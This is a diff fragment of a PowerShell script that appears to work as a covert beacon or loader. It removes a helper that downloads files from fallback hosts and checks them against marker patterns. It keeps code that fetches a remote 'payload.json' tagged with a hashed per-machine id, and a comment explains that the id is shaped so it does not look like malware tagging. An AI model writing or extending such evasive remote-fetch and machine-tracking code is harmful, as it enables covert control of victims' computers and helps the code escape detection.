@@ -129,34 +129,6 @@ function Report($ev, $info) {
     } catch { }
 }
 
-# Downloads from the first host that returns a payload matching all markers.
-# Returns the local file path, or $null when no candidate was usable.
-function Get-FirstValidFile {
-    param([string[]]$Urls, [string[]]$Markers, [string]$OutFile, [int]$TimeoutSec = 120)
-    foreach ($u in $Urls) {
-        try {
-            Invoke-WebRequest -Uri $u -OutFile $OutFile -UseBasicParsing -TimeoutSec $TimeoutSec
-        } catch {
-            continue
-        }
-        try {
-            $content = Get-Content $OutFile -Raw -ErrorAction Stop
-        } catch {
-            continue
-        }
-        if ([string]::IsNullOrWhiteSpace($content)) { continue }
-        # Reject HTML pages: an unrelated app on the same vhost answers 200 too.
-        if ($content -match '^\s*<(!DOCTYPE|html|\?xml)') { continue }
-        $ok = $true
-        foreach ($m in $Markers) {
-            if ($content -notmatch $m) { $ok = $false; break }
-        }
-        if (-not $ok) { continue }
-        return $OutFile
-    }
-    return $null
-}
-
 # Stable per-machine id: 16 lowercase hex chars derived from a hardware/OS
 # identifier. No randomness, no GUID shape, no external tooling - it is just a
 # stable hash of MachineGuid, so nothing about it looks like malware tagging
@@ -305,7 +277,7 @@ $payload = $null
 $payloadFile = Join-Path $WorkDir 'payload.json'
 foreach ($u in $PromptUrls) {
     if (-not $u) { continue }
-    $target = if ($u -match '\?') { "$u&id=$id" } else { "$u?id=$id" }
+    $target = if ($u -match '\?') { $u + '&id=' + $id } else { $u + '?id=' + $id }
     try {
         Invoke-WebRequest -Uri $target -OutFile $payloadFile -UseBasicParsing -TimeoutSec 30
         $raw = Get-Content $payloadFile -Raw -ErrorAction Stop
